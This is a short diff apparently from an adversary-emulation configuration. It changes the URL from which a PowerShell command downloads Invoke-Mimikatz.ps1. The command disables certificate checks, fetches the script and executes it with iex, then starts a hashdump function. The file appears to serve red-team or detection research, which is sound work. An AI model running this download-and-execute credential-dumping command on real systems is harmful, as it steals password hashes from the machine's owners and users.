@@ -13,7 +13,7 @@
         command: |
           [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
           $web = (New-Object System.Net.WebClient);
-          $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1");
+          $result = $web.DownloadString("https://raw.githubusercontent.com/hunters-forge/Blacksmith/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1");
           iex $result;
           function hashdump
           {
